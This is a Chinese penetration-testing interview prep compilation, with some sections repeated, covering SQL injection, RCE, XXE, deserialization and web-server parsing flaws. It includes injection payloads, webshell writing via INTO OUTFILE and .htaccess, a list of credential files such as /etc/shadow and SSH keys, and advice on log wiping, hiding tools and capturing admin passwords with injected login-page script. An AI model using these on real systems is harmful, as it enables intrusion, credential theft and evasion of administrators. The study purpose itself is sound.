　　直接用7KB或破壳挂字典在网站二级目录/abc/下扫描敏感文件及目录。

　　5、Nmap主要功能有哪些，扫描的几种方式、绕过ping扫描、漏洞检测等?

　　四大功能：分别为主机发现(参数-sn)、端口扫描(-sS -sU)、版本侦测(-sV)、OS侦测(-O);

　　扫描方式有：tcp connec()、TCP SYN scanning、TCP FIN scanning、Null scan等;

　　绕过ping扫描参数为：nmap -Pn XXX.XXX.XXX.XXX;

　　漏洞检测可直接nmap 目标 --script=auth，vuln;

　　6、sql注入的几种类型?

　　1、报错注入;2、bool型注入;3、延时注入;4、宽字节注入

　　7、任意文件下载防范方法有哪些?

　　1、过滤"."，使用户在url中不能回溯上级目录;

　　2、正则严格判断用户输入参数的格式;

　　3、php.ini配置open_basedir限定文件访问范围。



> 好的代码审计辅助工具可能让我的的代码审计事半功倍。
>
> 代码审计工具：
>
> PHP：Seay、RIPS、Fortify SCA
>
> java：FindBugs IDEA、Android Lint
>
> C++：Flawfinder
>
> JS：eslint、NodeJsScan
>
> go：goint、go tool vet、gas
>
> Python：pylint、bandit、py-find-injection、pyt
>
> 多种语言的安全代码检查工具：sonar
>
> 商业代码审计工具：
>
> 静态分析工具：RISP，VCG，Fortify SCA
>
> 动态分析工具：360的sky wolf，鸟哥的taint

### 3. 应急响应你的思路

> [ 应急响应 ]服务器(电脑)受到攻击该如何处理?(一)

### 4. 处理勒索病毒，你的思路是什么，文件被加密，怎么处理呢？

> [ 应急响应 ]服务器(电脑)受到攻击该如何处理?(一)

### 5. 给你一个站点渗透，你的思路是什么？

> (2条消息) 渗透测试流程详解__PowerShell的博客-CSDN博客

### 6. 有没有挖过SRC

> 对于这个问题的话，看自己实际情况，如实回答，不然就给自己挖了一个大坑。
>
> 挖过就说挖过，简单讲一讲，挖过啥，那里挖的，哇的时候是什么思路，什么漏洞，利用点是什么，你的修复思路。
>
> 没挖过，但是我有过xxx实战经历，具体的讲，思路利用过程。

### 7. 有没有复现过经典的漏洞

> 这个题目不能答没有，作为一个想入门安全圈子的小伙伴，这个必须有。
>
> 复现过哪些，最熟悉xxx，具体讲一讲。
>
> 最好是永恒之蓝，脏牛漏洞，FastJson反序列化，Apache Shiro这些经典的漏洞。
>
> 当然，log4j rce 这种新出的能讲是最好的，说明你关注安全圈时事。

### 8. 讲一下sql注入，具体一点，能讲多少讲多少

> 这就是老生常谈，放水的题目了。
>
> 最好讲全面一点，但是需要注意时间，不要讲的太长了，最多不要超过五分钟。
>
> 含义、原理、条件、危害、防御、分类、利用、常用函数、绕waf等等的方面。
>
> (3条消息) 常见web漏洞总结------SQL注入__PowerShell的博客-CSDN博客

### 9. 你了解RCE漏洞吗

> 远程代码执行漏洞。（后续详细介绍）
>
> **原理：**设计者由于设计需要**提供**给客户指定的远程命令操作的**接口**（常见于路由器 防火墙 入侵检测等设备的web管理界面上）
>
> 设计者对用户输入的命令 又没有做或者做了不严谨 的控制
>
> 导致攻击者可以输入一些其他命令
>
> **防御：**一定要对输入进行严格的处理  过滤  或者做一个严格的白名单
>
> **php能远程执行的函数**
>
> **命令执行的函数：**
>
> **1. system：**执行一个外部的应用程序并显示输出的结果
>
> **2. exec：**执行一个外部的应用程序
>
> **3. shell_exec：**执行shell命令并返回输出的结果的字符串
>
> **4. passthru：**执行一个UNIX系统命令并显示原始的输出
>
> **5. popen()**
>
> **6. proc_popen()**
>
> **代码执行的两个函数:**
>
> **1.eval(PHP代码)**
>
> **2.assert(PHP代码)**
>
> **3.preg_replace**

### 10. 你对逻辑漏洞，了解多少

> (5条消息) 业务逻辑漏洞__PowerShell的博客-CSDN博客

### 11. 编程语言了解哪些，最熟的是哪个，用它干过什么？

> 这个的话就比较开放了，最好多说几个了解的，php，java，JavaScript，python，c，c++等。
>
> 我对xxx比较熟悉，我用它做过xxx项目。举一个xxx项目讲一下，讲具体。

### 12. CS工具

> cobaltstrike（具体的安装使用后续详解）
>
> 渗透测试中不可缺少的利器，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。
>
> 同时，Cobalt Strike还可以调用Mimikatz等其他知名工具。

## 二面：

### 1. 自我介绍

> 看上文

### 2. SQl注入 原理 分类 防御

> 看上文

### 3. 按数据库了解哪些简单讲讲

> Mysql、MsSQL、Oracle、Access
>
> Access：是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名：.mdb。一般是asp的网页文件用access数据库
>
> SQL Server：1433：是一个比较大型的数据库。数据库后缀名 .mdf
>
> MySQL：3306：是一个关系型数据库管理系统。MySQL数据库大部分是php的页面。
>
> Oracle：1521：关系数据库管理系统。常用于比较大的网站。
>
> 差异：
>
> 成本上的差距：access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。
>
> 处理能力：access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访问。
>
> 数据库的规模：access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。

### 4. Mysql 写函数 ？

> root权限以及网站的绝对路径。
>
> select '一句话' **into outfile** '路径';
>
> select '一句话' into dumpfile '路径';
>
> select '' **into dumpfile** 'd:wwwrootbaidu.comnvhack.php';
>
> 读文件：load file

### 5. 报错函数你了解哪些？

> 最好，十来个报错函数，全部答出来。
>
> 挑两三个具体讲解，重点讲解：floor 函数

### 6. 预编译原理是什么？

> 替换，不让sql语句编译

### 7. MsSQL主要用到存储过程了解吗？

> xp_cmdshell（这个我不太会）

### 8. Oracle写shell怎么写？

> 不会
>
> (7条消息) Oracle注入 - 命令执行&Shell反弹_3569-CSDN博客_oracle注入getshell

### 9. redis了解过吗？未授权漏洞了解吗？

> （后续详解）
>
> 了解不多，有在最近的学习计划中，ridis未授权漏洞比较熟悉。ridis未授权漏洞讲明白。
>
> 简单来说，漏洞产生的条件有以下两点：
>
> \1. redis服务绑定在0.0.0.0:6379端口，而且信任了其他IP，导致了Redis服务暴露在公网上
>
> \2. 没有设置密码认证，可以免密登陆Redis服务
>
> 危害：
>
> \1. 导致敏感信息泄露，恶意执行flushall清空所有数据
>
> \2. 通过Eval执行Lua代码，通过备份功能往磁盘写入后门文件
>
> \3. 如果Redis服务以root身份运行，可以给root用户写入SSH公钥文件，直接通过SSH登陆服务器

### 10. XSS 原理 分类 利用

> (7条消息) [ 常见漏洞篇 ]常见web漏洞总结------XSS跨站脚本漏洞__PowerShell的博客-CSDN博客

### 11. HttpOnly有什么作用？

> 不太了解
>
> (7条消息) Cookie中的httponly的属性和作用_YG青松的博客-CSDN博客_httponly

### 12. 反序列化了解过吗？

> php、java的必须要涉及。FastJson反序列化漏洞复现顺便讲一下最好。（后续详解）
>
> **1. php反序列化：**
>
> 使用了序列化（serialize） 反序列化（unserialize） 函数
>
> 序列化之后我们可以通过接口或者网络去传输他接收到这个序列化数据之后我们要把它进行反序列化才能对他进行使用
>
> **产生原因**
>
> 程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制
>
> [反序列化的内容使用户可以控制的（前端传进来）
>
> 且后台使用了PHP中的魔法函数  
>
> 用户的输入会被反序列化
>
> 反序列化的过程中  我们代码会被执行  就导致了安全问题]
>
> **防御：**不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。
>
> **2. Java反序列化漏洞原理**
>
> 序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。
>
> Java中的**ObjectOutputStream类的writeObject()**方法可以实现**序列化，**
>
> **ObjectInputStream类的readObject()**方法用于**反序列化。**
>
> **条件：**如果Java应用对用户输入，即不可信数据做了反序列化处理，
>
> **利用：**那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。
>
> **根源：**在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。
>
> **修复建议：**
>
> 1、将服务器安装的JDK升级到官方最新版本
>
> 2、对于**weblogic中间件反序列化漏洞**，需要及时打上最新的补丁，或者配置防火墙策略，屏蔽掉T3协议的访问，只开放对HTTP、HTTPS访问。
>
> 3、对于**Jboss、tomcat等中间件的反序列化漏洞**，可以将存在反序列化漏洞的jar包升级到最新版本，但特殊情况下，需要升级的jar包种类比较多，此修复建议很费时。
>
> 4、**检测防火墙配置**，是否开启对Java反序列化漏洞的防范策略

### 13. XXE了解过吗？

> (7条消息) 常见web漏洞------XXE__PowerShell的博客-CSDN博客

### 14. CSRF和SSRF的区别

> （后续详解）
>
> CSRF是跨站请求伪造攻击，由客户端发起
>
> SSRF是服务器端请求伪造，由服务器发起
>
> 重放攻击是将截获的数据包进行重放，达到身份认证等目的

### 15. 如果存在SSRF，端口探测时，限制了ip，如何绕过

> 可以使用localhost、以及圆圈数字的方式进行绕过。

### 16. 常用工具

> Nmap、Burpsuite、Sqlmap、Nessus，AWVS、cobaltstrike多讲一点
>
> 用过哪些，用的最多的是哪些。最好还能讲一些骚操作

### 17. 中间件漏洞了解过哪些 比如说Tomcat

> 最好熟悉，了解不多也没事，就说是遇到什么中间件，再搜索相关漏洞
>
> **1. Tomcat 任意文件写入（CVE-2017-12615）**
>
> 环境：Tomcat/8.0.30
>
> 漏洞本质：Tomcat配置文件/conf/web.xml 配置了可写（readonly=false），导致我们可以往服务器写文件：增加完配置之后，重启Tomcat，我们可以改readonly=true时。
>
> **修复：**
>
> 将readonly=true，默认为true。
>
> **2. Tomcat 远程代码执行（CVE-2019-0232）**
>
> 影响范围：9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93
>
> 影响系统：Windows
>
> **修复建议**
>
> 这个默认是关闭的，如果打开了请关闭，若需使用请升级版本。

### 18. 代码审计流程仔细讲一讲，哪一种语言你最熟悉呢？

> 看上文，都讲一讲。重点将最熟悉的。

### 19. 编程语言会哪些

> 如上文

### 20. PHP TP框架有学吗

> 最好是学过，不然就直接没学过。

### 21. 内网渗透流程能讲讲不

> （后续详解）
>
> 网络位置判断、信息收集、内网穿透、权限提升、清除痕迹等

### 22. 如何查看内网域名

> net user/domain net time /domain

## 写在最后：

> 特别看重实战经验，
>
> 建议：多挖洞，多复现漏洞



拿到一个待检测的站或给你一个网站，你觉得应该先做什么？



一、信息收集

1.获取域名的whois信息,获取注册者邮箱姓名电话等。

2.通过站长之家、明小子、k8等查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。

3、通过DNS域传送漏洞、备份号查询、SSl证书、APP、微信公众号、暴力破解、DNS历史记录、K8 C段查询、Jsfinder、360或华为威胁情报、证书序列号获取企业域名与ip。

4.通过Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞

5.通过7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针、管理员备份文件。

6.google hack 进一步探测网站的信息，后台，敏感文件

7、敏感信息收集，如github源码、用7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟馗之眼、天眼查、威胁情报、微步在线等

8、通过Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns记录

二、漏洞扫描

1用AWVS、APPSCAN、长亭科技的Xray等扫描器检测Web漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等

2用namp、天镜、Nessus、极光等扫描系统ip，对扫描出来的高危漏洞进行测试，如ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝2代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi等相关漏洞验证。

3漏洞利用

利用以上的方式拿到webshell，或者其他权限

4权限提升

提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权

5日志清理

操作系统、中间件、数据库等日志进行清除

6总结报告及修复方案

2你平时常去那些网站进行学习、挖漏洞提交到那些平台

一般去seebug、freebuf、吾爱破解、看雪论坛、阿里聚安全、PentesterLab、阿里云先知社区、四叶草安全等

挖洞一般提交给360补天、cnvd、教育漏洞平台、漏洞银行、wooyun、漏洞盒子众测平台

3 判断出网站的CMS对渗透有什么意义？

查找网上已曝光的程序漏洞。如果开源，还能下载相对应的源码进行代码审计

4常见的网站服务器容器（中间件）

IS、Apache、nginx、Lighttpd、Tomcat、Weblogic、Jboss

5一个成熟并且相对安全的CMS，渗透时扫目录的意义？

敏感文件、二级目录扫描，站长的误操作等，比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点。

6甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？

直接用7KB或破壳挂字典在网站二级目录/abc/下扫描敏感文件及目录。

7在渗透过程中，收集目标站注册人邮箱对我们有什么价值？

丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。

用邮箱做关键词进行丢进搜索引擎。

利用搜索到的关联信息找出其他邮进而得到常用社交账号。

社工找出社交账号，里面或许会找出管理员设置密码的习惯 。

利用已有信息生成专用字典。

观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西

8Nmap主要功能有那些，扫描的几种方式、绕过ping扫描、漏洞检测等

一、4大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS侦测(-O)

二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Null scan等，详细解读可参考：https://blog.csdn.net/k851819815/article/details/104427922

三、绕过ping扫描参数为：nmap -Pn XXX.XXX.XXX.XXX

四、漏洞检测可直接nmap 目标 --script=auth,vuln

9sql注入的几种类型？

1报错注入     2bool型注入   3延时注入     4宽字节注入

10延时注入如何来判断？

SQL盲注分为三大类：基于布尔型SQL盲注、基于时间型SQL盲注、基于报错型SQL盲注

基于布尔型SQL盲注:  XXX' and ascii(substr(database(),1,1))=112#

基于时间型SQL盲注:  XXX' and sleep(x)#

11sqlmap，怎么对一个注入点注入？

1）如果是get注入，直接，sqlmap -u "注入点网址".

2) 如果是post注入，可以sqlmap –r "burp地址访问包”

3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r "文件地址"，记得加上—level 3参数

12SQL注入防护方法？

1、涵数过滤，如!is_numeric涵数  //判断变量id是否为数字

2、直接下载相关防范注入文件，通过incloud包含放在网站配置文件里面，如360、阿里云、腾迅提供的防注入脚本

3、使用白名单来规范化输入验证方法

4、采用PDO预处理      5、使用Waf拦截

13常用中间件、数据库、第三方应用、操作系统默认配置文件是什么？

/root/.ssh/authorized_keys

/root/.ssh/id_rsa

/root/.ssh/id_ras.keystore

/root/.ssh/known_hosts //记录每个访问计算机用户的公钥

/etc/passwd

/etc/shadow

/etc/my.cnf //mysql配置文件

/etc/httpd/conf/httpd.conf //apache配置文件

/root/.bash_history //用户历史命令记录文件

/root/.mysql_history //mysql历史命令记录文件

/proc/mounts //记录系统挂载设备

/porc/config.gz //内核配置文件

/var/lib/mlocate/mlocate.db //全文件路径

/porc/self/cmdline //当前进程的cmdline参数

14任意文件下载防范方法有那些？

（1）过滤"."，使用户在url中不能回溯上级目录

（2）正则严格判断用户输入参数的格式

（3）php.ini配置open_basedir限定文件访问范围

15CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？

XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、输出时采用html实体编码。

CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer

XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。

16CSRF、SSRF和重放攻击有什么区别？

CSRF是跨站请求伪造攻击，由客户端发起；

SSRF是服务器端请求伪造，由服务器发起；

重放攻击是将截获的数据包进行重放，达到身份认证等目的。

17如何防止CSRF?

1、验证referer        2、验证token         3、增加验证码

18逻辑漏洞的类型

1订单金额任意修改

2验证码回传

3未进行登录凭证验证

4接口无限制枚举

5cookie设计存在缺陷

6找回密码存在设计缺陷

7单纯读取内存值数据来当做用户凭证



**.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？**

- 丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。
- 用邮箱做关键词进行丢进搜索引擎。
- 利用搜索到的关联信息找出其他邮进而得到常用社交账号。
- 社工找出社交账号，里面或许会找出管理员设置密码的习惯 。
- 利用已有信息生成专用字典。
- 观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。

**4.判断出网站的CMS对渗透有什么意义？**

- 查找网上已曝光的程序漏洞。
- 如果开源，还能下载相对应的源码进行代码审计。

**5.一个成熟并且相对安全的CMS，渗透时扫目录的意义？**

- 敏感文件、二级目录扫描
- 站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点

**6.常见的网站服务器容器。**

- IIS、Apache、nginx、Lighttpd、Tomcat

**7.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？**

- root权限以及网站的绝对路径。

**8.目前已知哪些版本的容器有解析漏洞，具体举例。**

- **IIS 6.0**
  `/xx.asp/xx.jpg "xx.asp"是文件夹名`
- **IIS 7.0/7.5**
  `默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析`
- **Nginx**
  `版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。`
  `空字节代码 xxx.jpg%00.php`
- **Apache**
  `上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀`
- **lighttpd**
  `xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！`

**9.如何手工快速判断目标站是windows还是linux服务器？**

- linux大小写敏感,windows大小写不敏感。

**10.为何一个mysql数据库的站，只有一个80端口开放？**

- 更改了端口，没有扫描出来。
- 站库分离。
- 3306端口不对外开放

**11.3389无法连接的几种情况。**

- 没开放3389 端口
- 端口被修改
- 防护拦截
- 处于内网(需进行端口转发)

**12.如何突破注入时字符被转义？**

- 宽字符注入
- hex编码绕过

**13.在某后台新闻编辑界面看到编辑器，应该先做什么？**

- 查看编辑器的名称版本,然后搜索公开的漏洞。

**14.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？**

- 能做的事情很多，用隐藏网马来举例子：
  插入
  `<FilesMatch "xxx.jpg"> SetHandler application/x-httpd-php </FilesMatch>`
  .jpg文件会被解析成.php文件。
- 具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。

**15.注入漏洞只能查账号密码？**

- 只要权限广，拖库脱到老。

**16.安全狗会追踪变量，从而发现出是一句话木马吗？**

- 是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。

**17.access 扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。**

- 迅雷下载，直接改后缀为.mdb。

**18.提权时选择可读写目录，为何尽量不用带空格的目录？**

- 因为exp执行多半需要空格界定参数

**19.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？**

- 同数据库。

**20.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？**

- and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。

**21:某个防注入系统，在注入时会提示：**

```
 系统检测到你有非法注入的行为。
 已记录您的ip xx.xx.xx.xx
 时间:2016:01-23
 提交页面:test.asp?id=15
 提交内容:and 1=1
```

**如何利用这个防注入系统拿shell？**

- 在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：http://ytxiao.lofter.com/post/40583a_ab36540。

**22.上传大马后访问乱码时，有哪些解决办法？**

- 浏览器中改编码。

**23.审查上传点的元素有什么意义？**

- 有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。

**24.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？**

- 先爆破用户名，再利用被爆破出来的用户名爆破密码。
- 其实有些站点，在登陆处也会这样提示
- 所有和数据库有交互的地方都有可能有注入。

**25.目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？**

- 这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。

**26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？**

- 直接在网站二级目录/abc/下扫描敏感文件及目录。

**27.在有shell的情况下，如何使用xss实现对目标站的长久控制？**

- 后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。
- 在登录后才可以访问的文件中插入XSS脚本。

**28.后台修改管理员密码处，原密码显示为\*。你觉得该怎样实现读出这个用户的密码？**

- 审查元素 把密码处的password属性改成text就明文显示了

**29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？**

- 原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过

**30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？**

- 在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到`<hws>内容<hws>`。

**31.在win2003服务器中建立一个 .zhongzi文件夹用意何为？**

- 隐藏文件夹，为了不让管理员发现你传上去的工具。

 

**32、sql注入有以下两个****测试****选项，选一个并且阐述不选另一个的理由：** 


A. demo.jsp?id=2+1    B. demo.jsp?id=2-1 
选B，在 URL 编码中 + 代表空格，可能会造成混淆

 

**33、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？** 


demo.do?DATA=AjAxNg== 
DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试

 

**34、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？** 


有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 
使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 
通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell

 

**35、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？** 


XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 


CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer 
XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。

 

**36、CSRF、SSRF和重放攻击有什么区别？** 


CSRF是跨站请求伪造攻击，由客户端发起 
SSRF是服务器端请求伪造，由服务器发起 
重放攻击是将截获的数据包进行重放，达到身份认证等目的

 

**37、说出至少三种业务逻辑漏洞，以及修复方式？** 


密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码 
身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可伪造用户身份 
验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行绕过

 

**38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？**

 

```
get /ecskins/demo.jsp?uid=2016031900&keyword=”hello world” 
HTTP/1.1Host:*******.com:82User-Agent:Mozilla/
5.0 Firefox/40Accept:text/css,*/*;q=0.1
Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3
Referer:http://*******.com/eciop/orderForCC/
cgtListForCC.htm?zone=11370601&v=145902
Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;
uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;
st_uid=N90PLYHLZGJXI-NX01VPUF46W;
status=True
Connection:keep-alive
```

**sql注入单引号被过滤了怎么绕过?**

攻击方账号输入 1/，密码输入or 1=1 --+ ，最后拼接出来的语句是select * from xxx where id="1/" and pwd="or 1=1--+" 其中/将"转义，id的值就变为（1" and pw=），后边跟一个or 1=1返回的逻辑为true就可以进行SQL注入了。



**过滤了select怎么注入？**

盲注 但是只能注入当前表
如果可以堆叠注入的话，可以赋值变量为16进制



**mysql不知道列名怎么爆字段？**

查询information_schema表。

追问，**这个表无权访问怎么办？**

利用union查询，进行查询时语句的字段数必须和指定表中的字段数一样，不能多也不能少，不然就会报错，例如：Select 1,2,3 union select * from xxx; （xxx表有三列），结果为三列。



**mysql报错注入常用的函数及原理?**

**1.XML类**

**extractvalue**() 对xml文档查询，报错原理与updatexml相同

**updatexml**(1,concat(0x7e,(SELECT @@version),0x7e),1) 对xml文档修改

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc

第二个参数：XPath_string (Xpath格式的字符串) ，Xpath即为xml文档中的路径表示方法（标签即视为路径），有点类似于linux文件系统的路径表示

第三个参数：new_value，String格式，替换查找到的符合条件的数据

语句中，**concat返回的路径不符合Xpath格式，所以报XPATH syntax error的错**



**2.floor()+rand()+group by**

向下取整

select count(*),(concat(floor(rand(0)*2),(select version())))x from table1 group by x;

**group by会产生虚拟表，floor(rand(0)\*2)产生0或1，导致虚拟表主键重复,产生报错**



**3.exp() 溢出**

id=1 and exp(~(select * from(select user())a))，利用exp溢出、取反~、子查询。

[基于exp溢出的sql报错注入](https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/)



**几何函数**

geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()

例如，id=1 and linestring((select * from(select * from(select user())a)b))



**宽字节注入原理?**

宽字节是在一些**特定的编码**，如GBK中才有的，编码将两个字节认为是一个汉字（前一个字符ascii码要大于128，才到汉字的范围）。PHP的**[addslashes](https://www.php.net/manual/zh/function.addslashes.php)**函数为了防止sql注入，将传入参数值进行转义，将" 转义为/"，单引号失去作用。因此，我们需要将/给绕过，这样才可以加"号。



**pdo防sql注入原理？**

参数化查询：变量和SQL模板分两次发送，预编译已经产生了**词法分析树**，再传参不会修改语义。

预编译select a from b where c = ? and d = ? 再传递变量进去



**通过sql注入写webshell导致RCE？**

select ... into outfile "filename"

例如

> select into outfile xxx

具有文件读写权限，写入的文件所在目录有执行权限才可以。



**sqlmap的使用模式和支持的数据库？**

BEUSTQ，布尔盲注、错误、联合、堆叠、时间、内联

支持数据库：MySQL,Oracle,PostgreSQL,Microsoft SQL Server,MicrosoftAccess, IBM DB2,SQLite,Firebird,Sybase和SAP MaxDB



**limit 后怎么注入？**

procedure analyse()这个子查询，利用extractvalue ，BENCHMARK等函数

参考：[MySQL 在 LIMIT 条件后注入 - 情三 - 博客园](https://www.cnblogs.com/qing123/p/4575901.html)



### Broken Authentication-失效的身份认证

与身份验证和会话管理相关的应用程序功能经常被错误地实现，允许攻击者破坏密码、密钥或会话令牌，或利用其他实现缺陷来**暂时或永久地假设其他用户的身份**。

例如：token不够随机，可预测



### Sensitive Data Exposure-敏感数据泄露

许多 Web 应用程序和 API 没有正确保护敏感数据，例如金融、医疗保健。攻击者可能会窃取或修改此类保护不力的数据，以实施**信用卡**欺诈、**身份盗用**或其他犯罪活动。敏感数据可能会在没有额外保护的情况下受到损害，例如静态或传输中的加密，并且在与浏览器交换时需要特殊的预防措施。

例如，查看他人信息的API，身份证号在前端加了*，导致可以在流量中获取完整身份证号，导致密码为生日的用户被攻击。



### XXE-XML 外部实体

许多旧的或配置不当的 XML 处理器评估 XML 文档中的外部实体引用。外部实体可用于使用文件 URI 处理程序、内部文件共享、内部端口扫描、远程代码执行和拒绝服务攻击来公开内部文件。



**简述一下XXE漏洞产生的原理，针对PHP和JAVA，XXE分别可以进行哪些恶意利用?**

服务端接收并解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。

图片来源： https://xz.aliyun.com/t/3357#toc-8

### **Broken Access Control-无效的访问控制**

对经过身份验证的用户可以做什么的限制通常没有得到正确执行。攻击者可以利用这些缺陷来访问**未经授权**的功能和数据，进而**越权**，例如访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。



### Security Misconfiguration-安全配置错误

安全配置错误可以发生在一个应用程序堆栈的任何层面，包括平台、Web服务器、应用服务器、数据库、框架和自定义代码。开发人员和系统管理员需共同努力，以确保整个堆栈的正确配置。自动扫描器可用于检测未安装的补丁、错误的配置、默认帐户的使用、不必要的服务等。



### XSS-跨站脚本攻击

**XSS漏洞的防御策略?**

前端过滤字符，后端白名单（例如，CSP）只允许固定的标签，设置http-only，防止cookie被读取。



**DOM型XSS和一般的XSS区别？**

基于文档对象模型(Document Object Model，DOM)的一种漏洞，在JavaScript脚本动态执行的过程中产生的。



